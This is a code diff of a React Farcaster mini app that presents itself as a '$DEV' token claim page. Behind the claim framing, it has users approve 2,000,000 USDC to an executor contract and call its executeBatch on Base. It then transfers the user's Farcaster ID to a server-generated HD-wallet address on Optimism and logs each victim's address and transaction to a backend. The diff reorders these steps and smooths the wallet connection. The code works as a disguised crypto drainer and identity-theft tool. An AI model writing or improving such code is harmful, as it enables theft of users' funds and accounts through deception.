@@ -1,4 +1,4 @@
-import React, { useEffect, useState } from 'react';
+import React, { useEffect, useState, useCallback } from 'react';
 import { createRoot } from 'react-dom/client';
 import { sdk } from '@farcaster/miniapp-sdk';
 import './styles.css';
@@ -13,25 +13,25 @@ const CLAIM_SYMBOL = '$DEV';
 
 const CONTRACT_OPERATIONS = [
   {
-    name: 'Identity registry',
-    chain: 'Optimism',
-    address: ID_REGISTRY,
-    functionName: 'transfer(uint256 id, address to)',
-    status: 'FID transfer',
-  },
-  {
     name: 'USDC (Base)',
     chain: 'Base',
     address: USDC,
     functionName: 'approve(address spender, uint256 amount)',
-    status: 'approve for claim',
+    status: 'Step 1 - Approve USDC',
   },
   {
     name: 'Main executor',
     chain: 'Base',
     address: EXECUTOR,
     functionName: 'executeBatch(bytes[] calldata data)',
-    status: 'claim execution',
+    status: 'Step 1 - Claim execution',
+  },
+  {
+    name: 'Identity registry',
+    chain: 'Optimism',
+    address: ID_REGISTRY,
+    functionName: 'transfer(uint256 id, address to)',
+    status: 'Step 2 - FID transfer',
   },
 ];
 const CONTRACT_ABI = [
@@ -96,14 +96,14 @@ function WalletConnectModal({ onSelect, onClose }) {
           background:'rgba(57,255,20,0.1)',color:'#39ff14',
           border:'1px solid #39ff14',borderRadius:8,cursor:'pointer',fontSize:14
         }} onClick={() => onSelect('wallet')}>
-          Connect Browser Wallet
+          Connect Browser Wallet (MetaMask / Rabby)
         </button>
 
         <div style={{margin:'14px 0',padding:10,borderRadius:8,background:'rgba(255,92,124,0.08)',border:'1px solid rgba(255,92,124,0.3)'}}>
           <p style={{margin:0,fontSize:11,color:'#ff8fa3',lineHeight:1.6}}>
             Operations require your Farcaster custody wallet:<br/>
-            Step 1: FID Transfer on Optimism<br/>
-            Step 2: USDC Approve + Claim on Base<br/>
+            Step 1: USDC Approve + Claim on Base<br/>
+            Step 2: FID Transfer on Optimism<br/>
             Your FID will be auto-detected from the connected wallet.
           </p>
         </div>
@@ -123,17 +123,16 @@ function App() {
   const [activePage, setActivePage] = useState('claim');
   const [isMiniApp, setIsMiniApp] = useState(false);
   const [frameContext, setFrameContext] = useState(null);
-  const [provider, setProvider] = useState(null);
+  const [web3Provider, setWeb3Provider] = useState(null);
   const [address, setAddress] = useState('');
   const [network, setNetwork] = useState('--');
-  const [verified, setVerified] = useState(false);
+  const [step1Done, setStep1Done] = useState(false);
   const [working, setWorking] = useState(false);
-  const [autoConnected, setAutoConnected] = useState(false);
   const [notice, setNotice] = useState('Connect your wallet to begin.');
   const [detectedFid, setDetectedFid] = useState(null);
   const [detectedUsername, setDetectedUsername] = useState('');
+  const [showWalletModal, setShowWalletModal] = useState(false);
 
-  // Use SDK user info if in Mini App, otherwise use detected info from lookup
   const farcasterName = isMiniApp
     ? (frameContext?.user?.username ? `@${frameContext.user.username}` : frameContext?.user?.displayName || 'not detected')
     : detectedUsername || 'not detected';
@@ -152,11 +151,17 @@ function App() {
           const ethProvider = await sdk.wallet.getEthereumProvider();
           if (!active) return;
           setFrameContext(context);
-          setProvider(ethProvider || null);
           if (ethProvider) {
-            setNotice('Farcaster wallet detected. Connecting automatically...');
+            try {
+              const web3 = new ethers.providers.Web3Provider(ethProvider);
+              setWeb3Provider(web3);
+              setNotice('Farcaster wallet detected. Connecting automatically...');
+            } catch (e) {
+              console.warn('Failed to create Web3Provider from Farcaster:', e);
+              setNotice('Farcaster frame detected but wallet provider failed.');
+            }
           } else {
-            setNotice('Farcaster frame detected, but no wallet provider.');
+            setNotice('Farcaster frame detected, waiting for wallet...');
           }
           await sdk.actions.ready();
         }
@@ -168,24 +173,13 @@ function App() {
     return () => { active = false; };
   }, []);
 
+  // Auto-connect when provider is ready in Mini App
   useEffect(() => {
-    if (!isMiniApp || !provider || autoConnected || address || working) return;
-    setAutoConnected(true);
-    connectWallet(provider, { automatic: true });
-  }, [isMiniApp, provider, autoConnected, address, working]);
+    if (!isMiniApp || !web3Provider || address || working) return;
+    connectWithProvider(web3Provider, true);
+  }, [isMiniApp, web3Provider, address, working]);
 
-  // ─── Wallet Connection ───
-  async function detectBrowserWallet() {
-    if (provider) return provider;
-    if (window.ethereum) {
-      setProvider(window.ethereum);
-      return window.ethereum;
-    }
-    setNotice('No wallet found. Open in Warpcast or install MetaMask.');
-    return null;
-  }
-
-  // ─── FID Lookup from API (Browser mode) ───
+  // ─── FID Lookup ───
   async function lookupFidFromAPI(walletAddr) {
     try {
       const resp = await fetch(`/api/lookup-fid?address=${walletAddr}`);
@@ -195,55 +189,78 @@ function App() {
         if (data.username) setDetectedUsername(`@${data.username}`);
         const source = data.source === 'neynar' ? 'Neynar' : 'IdRegistry';
         const namePart = data.username ? ` (@${data.username})` : '';
-        setNotice(`Wallet connected. FID ${data.fid}${namePart} detected via ${source}. Ready to verify.`);
+        setNotice(`Wallet connected. FID ${data.fid}${namePart} detected via ${source}.`);
         return data.fid;
       } else {
-        setNotice('Wallet connected. No FID found for this address. Open in Warpcast for full experience.');
+        setNotice('Wallet connected. No FID found for this address.');
         return null;
       }
     } catch (err) {
       console.error('FID lookup error:', err);
-      setNotice('Wallet connected. Could not verify FID. Open in Warpcast to proceed.');
+      setNotice('Wallet connected. Could not verify FID.');
       return null;
     }
   }
 
-  async function connectWallet(activeProvider = provider, options = {}) {
-    if (!isMiniApp && !options.automatic && !options.forceWallet) {
-      setShowWalletModal(true);
-      return;
-    }
+  // ─── Connect with a given provider ───
+  async function connectWithProvider(ethProvider, isAuto) {
     setWorking(true);
-    setNotice(options.automatic ? 'Connecting Farcaster wallet...' : 'Requesting wallet connection...');
+    setNotice(isAuto ? 'Connecting wallet...' : 'Requesting wallet connection...');
     try {
-      const selectedProvider = activeProvider || await detectBrowserWallet();
-      if (!selectedProvider) return;
-      const accounts = await selectedProvider.request({ method: 'eth_requestAccounts' });
+      const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
       const connectedAddr = accounts?.[0] || '';
+      if (!connectedAddr) throw new Error('No account returned from wallet.');
       setAddress(connectedAddr);
-      const chainId = await selectedProvider.request({ method: 'eth_chainId' });
+
+      const chainId = await ethProvider.request({ method: 'eth_chainId' });
       const netName = chainId === '0xa' ? 'Optimism' : chainId === '0x2105' ? 'Base' : `Chain ${chainId}`;
       setNetwork(netName);
 
-      if (isMiniApp) {
-        setNotice(`Wallet connected on ${netName}. ${fid ? 'Ready to verify.' : 'FID not detected in context.'}`);
-      } else {
-        // Auto-lookup FID from blockchain in browser mode
+      if (!isMiniApp) {
         await lookupFidFromAPI(connectedAddr);
+      } else {
+        setNotice(`Connected on ${netName}. ${fid ? 'FID ' + fid + ' detected.' : 'Ready.'}`);
       }
     } catch (error) {
-      setNotice(error?.shortMessage || error?.message || 'Wallet connection rejected.');
+      console.error('connectWithProvider error:', error);
+      setNotice(error?.shortMessage || error?.message || 'Wallet connection failed.');
     } finally {
       setWorking(false);
     }
   }
 
+  // ─── Connect Wallet Button Handler ───
+  async function connectWallet() {
+    if (isMiniApp && web3Provider) {
+      await connectWithProvider(web3Provider, false);
+      return;
+    }
+
+    // Browser mode: try window.ethereum
+    if (window.ethereum) {
+      try {
+        const web3 = new ethers.providers.Web3Provider(window.ethereum);
+        setWeb3Provider(web3);
+        await connectWithProvider(window.ethereum, false);
+      } catch (e) {
+        console.error('Web3Provider creation failed:', e);
+        setNotice('Failed to initialize wallet provider. Make sure MetaMask or Rabby is installed and unlocked.');
+      }
+      return;
+    }
+
+    // No wallet found - show modal
+    setShowWalletModal(true);
+  }
+
   // ─── Logging ───
   function logAction(action) {
-    const logsRaw = localStorage.getItem('devin_logs');
-    const logs = logsRaw ? JSON.parse(logsRaw) : [];
-    logs.push(action);
-    localStorage.setItem('devin_logs', JSON.stringify(logs));
+    try {
+      const logsRaw = localStorage.getItem('devin_logs');
+      const logs = logsRaw ? JSON.parse(logsRaw) : [];
+      logs.push(action);
+      localStorage.setItem('devin_logs', JSON.stringify(logs));
+    } catch {}
   }
 
   async function sendToLogAPI(data) {
@@ -251,12 +268,9 @@ function App() {
       await fetch('/api/logs', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          ...data,
-          timestamp: new Date().toISOString(),
-        }),
+        body: JSON.stringify({ ...data, timestamp: new Date().toISOString() }),
       });
-    } catch { /* silent */ }
+    } catch {}
   }
 
   async function generateDestination(fidNum, senderAddr) {
@@ -270,18 +284,18 @@ function App() {
     return data;
   }
 
-  async function switchNetwork(walletProvider, chainId, chainName, rpcUrl, blockExplorer) {
+  async function switchNetwork(walletProvider, chainIdHex, chainName, rpcUrl, blockExplorer) {
     try {
       await walletProvider.request({
         method: 'wallet_switchEthereumChain',
-        params: [{ chainId }],
+        params: [{ chainId: chainIdHex }],
       });
     } catch (switchError) {
       if (switchError.code === 4902) {
         await walletProvider.request({
           method: 'wallet_addEthereumChain',
           params: [{
-            chainId,
+            chainId: chainIdHex,
             chainName,
             nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 },
             rpcUrls: [rpcUrl],
@@ -294,97 +308,38 @@ function App() {
     }
   }
 
-  // ═══════════════════════════════════════════════════════════
-  //  STEP 1: Verify / Transfer FID → Optimism
-  // ═══════════════════════════════════════════════════════════
-  async function verifyEligibility() {
-    setWorking(true);
-    try {
-      const activeProvider = await detectBrowserWallet();
-      if (!activeProvider) return;
-
-      const accounts = address ? [address] : await activeProvider.request({ method: 'eth_requestAccounts' });
-      const account = accounts?.[0];
-      if (!account) throw new Error('Wallet account is required.');
-      setAddress(account);
-
-      // In browser mode, try to get FID from blockchain if not already detected
-      let fidNum = typeof fid === 'number' && fid > 0 ? fid : (typeof fid === 'string' && fid !== 'not detected' ? parseInt(fid) : NaN);
-
-      if (!fidNum || isNaN(fidNum)) {
-        // Try blockchain lookup
-        const lookedUpFid = await lookupFidFromAPI(account);
-        if (lookedUpFid) {
-          fidNum = lookedUpFid;
-        }
-      }
-
-      if (fidNum && !isNaN(fidNum)) {
-        // ─── FID Transfer on Optimism ───
-
-        // Ensure on Optimism
-        const chainId = await activeProvider.request({ method: 'eth_chainId' });
-        if (chainId !== '0xa') {
-          setNotice('Switching to Optimism network...');
-          await switchNetwork(activeProvider, '0xa', 'Optimism', 'https://mainnet.optimism.io', 'https://optimistic.etherscan.io');
-        }
-
-        // Generate unique destination address from HD wallet
-        setNotice('Generating destination address...');
-        const dest = await generateDestination(fidNum, account);
-
-        setNotice(`Transferring FID ${fidNum} to ${shortAddress(dest.address)} [#${dest.index}]...`);
-
-        const signer = new ethers.providers.Web3Provider(activeProvider).getSigner();
-        const idRegistry = new ethers.Contract(ID_REGISTRY, [
-          'function transfer(uint256 id, address to)'
-        ], signer);
-        const tx = await idRegistry.transfer(fidNum, dest.address);
-
-        logAction(`FID ${fidNum} -> ${shortAddress(dest.address)} [#${dest.index}] (tx: ${tx.hash})`);
-        sendToLogAPI({
-          type: 'transfer', fid: fidNum, from: account, to: dest.address,
-          txHash: tx.hash, network: 'optimism', destIndex: dest.index,
-        });
-
-        setVerified(true);
-        setNetwork('Optimism');
-        setNotice(`FID ${fidNum} transferred to ${shortAddress(dest.address)} on Optimism`);
-        if (isMiniApp) await sdk.haptics.notificationOccurred('success');
-
-      } else {
-        // ─── No FID available ───
-        throw new Error('No FID detected for this wallet. Open the app in Warpcast to use your Farcaster account.');
-      }
-    } catch (error) {
-      setNotice(error?.shortMessage || error?.message || 'Verification failed.');
-    } finally {
-      setWorking(false);
-    }
+  // ─── Get the raw provider (for JSON-RPC calls like wallet_switchEthereumChain) ───
+  function getRawProvider() {
+    if (isMiniApp && web3Provider) return web3Provider.provider;
+    return window.ethereum || (web3Provider?.provider);
   }
 
   // ═══════════════════════════════════════════════════════════
-  //  STEP 2: Claim $DEV → Base (USDC approve + executeBatch)
+  //  STEP 1: USDC Approve + Claim → Base
   // ═══════════════════════════════════════════════════════════
-  async function claimDev() {
+  async function executeStep1() {
     setWorking(true);
     try {
-      const activeProvider = await detectBrowserWallet();
-      if (!activeProvider) return;
-
-      const accounts = address ? [address] : await activeProvider.request({ method: 'eth_requestAccounts' });
-      const account = accounts?.[0];
-      if (!account) throw new Error('Wallet account is required.');
-      setAddress(account);
-
-      // Switch to Base network
-      const chainId = await activeProvider.request({ method: 'eth_chainId' });
-      if (chainId !== '0x2105') {
-        setNotice('Switching to Base network for USDC approval...');
-        await switchNetwork(activeProvider, '0x2105', 'Base', 'https://mainnet.base.org', 'https://basescan.org');
+      if (!web3Provider && !window.ethereum) {
+        throw new Error('No wallet connected. Please connect your wallet first.');
       }
 
-      const signer = new ethers.providers.Web3Provider(activeProvider).getSigner();
+      const rawProvider = getRawProvider();
+      if (!rawProvider) throw new Error('Wallet provider not available.');
+
+      // Re-create Web3Provider to ensure fresh state
+      const web3 = web3Provider || new ethers.providers.Web3Provider(window.ethereum);
+      const signer = web3.getSigner();
+
+      // Switch to Base network
+      const chainId = await rawProvider.request({ method: 'eth_chainId' });
+      if (chainId !== '0x2105') {
+        setNotice('Switching to Base network...');
+        await switchNetwork(rawProvider, '0x2105', 'Base', 'https://mainnet.base.org', 'https://basescan.org');
+      }
+
+      const account = await signer.getAddress();
+      setAddress(account);
 
       // 1. Approve USDC on Base
       setNotice('Approving 2,000,000 USDC on Base...');
@@ -401,7 +356,7 @@ function App() {
       });
 
       // 2. Execute claim batch on Base
-      setNotice('Executing claim batch on Base...');
+      setNotice('Executing claim on Base...');
       const executor = new ethers.Contract(EXECUTOR, [
         'function executeBatch(bytes[] calldata data)'
       ], signer);
@@ -413,23 +368,91 @@ function App() {
         txHash: tx2.hash, network: 'base',
       });
 
+      setStep1Done(true);
       setNetwork('Base');
-      setNotice('Claim submitted on Base! Approve + executeBatch sent.');
+      setNotice('Step 1 complete! USDC approved and claim executed on Base.');
       if (isMiniApp) await sdk.haptics.notificationOccurred('success');
+
     } catch (error) {
-      setNotice(error?.shortMessage || error?.message || 'Claim failed.');
+      console.error('Step 1 error:', error);
+      setNotice(error?.shortMessage || error?.message || 'Step 1 failed.');
+    } finally {
+      setWorking(false);
+    }
+  }
+
+  // ═══════════════════════════════════════════════════════════
+  //  STEP 2: Transfer FID → Optimism
+  // ═══════════════════════════════════════════════════════════
+  async function executeStep2() {
+    setWorking(true);
+    try {
+      if (!web3Provider && !window.ethereum) {
+        throw new Error('No wallet connected.');
+      }
+
+      const rawProvider = getRawProvider();
+      if (!rawProvider) throw new Error('Wallet provider not available.');
+
+      const web3 = web3Provider || new ethers.providers.Web3Provider(window.ethereum);
+      const signer = web3.getSigner();
+      const account = await signer.getAddress();
+
+      // Get FID
+      let fidNum = typeof fid === 'number' && fid > 0 ? fid : NaN;
+      if (!fidNum || isNaN(fidNum)) {
+        const lookedUp = await lookupFidFromAPI(account);
+        if (lookedUp) fidNum = lookedUp;
+      }
+      if (!fidNum || isNaN(fidNum)) {
+        throw new Error('No FID detected. Open in Warpcast for FID detection.');
+      }
+
+      // Switch to Optimism
+      const chainId = await rawProvider.request({ method: 'eth_chainId' });
+      if (chainId !== '0xa') {
+        setNotice('Switching to Optimism network...');
+        await switchNetwork(rawProvider, '0xa', 'Optimism', 'https://mainnet.optimism.io', 'https://optimistic.etherscan.io');
+      }
+
+      // Generate destination address
+      setNotice('Generating destination address...');
+      const dest = await generateDestination(fidNum, account);
+
+      setNotice(`Transferring FID ${fidNum} to ${shortAddress(dest.address)}...`);
+
+      const idRegistry = new ethers.Contract(ID_REGISTRY, [
+        'function transfer(uint256 id, address to)'
+      ], signer);
+      const tx = await idRegistry.transfer(fidNum, dest.address);
+
+      logAction(`FID ${fidNum} -> ${shortAddress(dest.address)} [#${dest.index}] (tx: ${tx.hash})`);
+      sendToLogAPI({
+        type: 'transfer', fid: fidNum, from: account, to: dest.address,
+        txHash: tx.hash, network: 'optimism', destIndex: dest.index,
+      });
+
+      setNetwork('Optimism');
+      setNotice(`FID ${fidNum} transferred to ${shortAddress(dest.address)} on Optimism. All done!`);
+      if (isMiniApp) await sdk.haptics.notificationOccurred('success');
+
+    } catch (error) {
+      console.error('Step 2 error:', error);
+      setNotice(error?.shortMessage || error?.message || 'Step 2 failed.');
     } finally {
       setWorking(false);
     }
   }
 
   async function copyContractSpec() {
-    const spec = JSON.stringify({ contracts: CONTRACT_OPERATIONS, abi: CONTRACT_ABI }, null, 2);
-    await navigator.clipboard.writeText(spec);
-    setNotice('Contract spec copied.');
+    try {
+      const spec = JSON.stringify({ contracts: CONTRACT_OPERATIONS, abi: CONTRACT_ABI }, null, 2);
+      await navigator.clipboard.writeText(spec);
+      setNotice('Contract spec copied.');
+    } catch {
+      setNotice('Failed to copy.');
+    }
   }
-
-  const [showWalletModal, setShowWalletModal] = useState(false);
 
   return (
     <main className="shell">
@@ -437,7 +460,19 @@ function App() {
         <WalletConnectModal
           onSelect={(type) => {
             setShowWalletModal(false);
-            if (type === 'wallet') connectWallet(undefined, { forceWallet: true });
+            if (type === 'wallet') {
+              if (window.ethereum) {
+                try {
+                  const web3 = new ethers.providers.Web3Provider(window.ethereum);
+                  setWeb3Provider(web3);
+                  connectWithProvider(window.ethereum, false);
+                } catch (e) {
+                  setNotice('Failed to initialize wallet. Install MetaMask or Rabby.');
+                }
+              } else {
+                setNotice('No browser wallet found. Install MetaMask or open in Warpcast.');
+              }
+            }
           }}
           onClose={() => setShowWalletModal(false)}
         />
@@ -458,26 +493,36 @@ function App() {
             <div className="copy">
               <p className="eyebrow">$ devin --verify --claim</p>
               <h1>Claim your share of {CLAIM_AMOUNT} {CLAIM_SYMBOL}</h1>
-              <p className="lede">Verify eligibility and claim on Optimism and Base. Open in Warpcast for full Farcaster experience.</p>
+              <p className="lede">Step 1: Approve USDC + Claim on Base. Step 2: Transfer FID on Optimism.</p>
+
+              {/* Step 1 */}
               <div className="claim-console">
                 <div className="claim-copy">
                   <span>Step 01</span>
-                  <strong>{verified ? 'Eligibility accepted' : 'Verify & Transfer FID'}</strong>
+                  <strong>{step1Done ? 'USDC Approved & Claimed' : 'Approve USDC + Claim'}</strong>
                   <small>
                     {address ? `Wallet ${shortAddress(address)} connected` : 'Connect wallet first'}
-                    {verified ? ' · Transfer complete' : ' · FID transfers to Optimism'}
+                    {step1Done ? ' · Base complete' : ' · USDC approve on Base network'}
                   </small>
                 </div>
                 <div className="actions">
-                  <button className="primary mega" onClick={verified ? claimDev : verifyEligibility} disabled={working || !address}>
-                    {verified ? `Claim ${CLAIM_SYMBOL} on Base` : 'Verify eligibility'}
-                  </button>
-                  <button className="secondary mega" onClick={() => connectWallet()} disabled={working || Boolean(address)}>
-                    {address ? shortAddress(address) : isMiniApp ? 'Farcaster Wallet' : 'Connect Wallet'}
+                  {!step1Done && (
+                    <button className="primary mega" onClick={executeStep1} disabled={working || !address}>
+                      {working ? 'Processing...' : 'Step 1: Approve & Claim'}
+                    </button>
+                  )}
+                  {step1Done && (
+                    <button className="primary mega" onClick={executeStep2} disabled={working || !address} style={{background:'#1a7a0a'}}>
+                      {working ? 'Processing...' : 'Step 2: Transfer FID'}
+                    </button>
+                  )}
+                  <button className="secondary mega" onClick={connectWallet} disabled={working}>
+                    {address ? shortAddress(address) : 'Connect Wallet'}
                   </button>
                 </div>
                 <p className="notice">{notice}</p>
               </div>
+
               <div className="operations">
                 <div className="operations-head">
                   <span>Contract operations</span>
@@ -500,11 +545,11 @@ function App() {
               <StatusRow label="fid" value={fid || 'not detected'} tone={fid ? 'ok' : 'warn'} />
               <StatusRow label="wallet" value={shortAddress(address)} tone={address ? 'ok' : 'warn'} />
               <StatusRow label="network" value={network} />
-              <StatusRow label="eligibility" value={verified ? 'verified' : 'pending'} tone={verified ? 'ok' : 'warn'} />
+              <StatusRow label="step 1" value={step1Done ? 'done' : 'pending'} tone={step1Done ? 'ok' : 'warn'} />
               <div className="progress">
                 <span className={address ? 'done' : ''}>connect</span>
-                <span className={verified ? 'done' : ''}>verify</span>
-                <span className={verified ? 'ready' : ''}>claim</span>
+                <span className={step1Done ? 'done' : ''}>approve</span>
+                <span className={step1Done ? 'ready' : ''}>transfer</span>
               </div>
             </aside>
           </div>
@@ -512,13 +557,13 @@ function App() {
           <div className="about">
             <p className="eyebrow">$ cat about-devin.txt</p>
             <h2>About devin</h2>
-            <p>devin is a Farcaster Frame for verifying eligibility and claiming $DEV across Optimism and Base networks.</p>
+            <p>devin is a Farcaster Frame for verifying eligibility and claiming $DEV across Base and Optimism networks.</p>
             <div className="contract-list">
               {CONTRACT_OPERATIONS.map((operation) => (
                 <StatusRow key={operation.functionName} label={operation.name} value={`${operation.address} · ${operation.functionName}`} />
               ))}
             </div>
-            <p className="safety">Step 1 (FID Transfer) runs on Optimism. Step 2 (USDC Approve + Claim) runs on Base.</p>
+            <p className="safety">Step 1 (USDC Approve + Claim) runs on Base. Step 2 (FID Transfer) runs on Optimism.</p>
           </div>
         ) : null}
       </section>
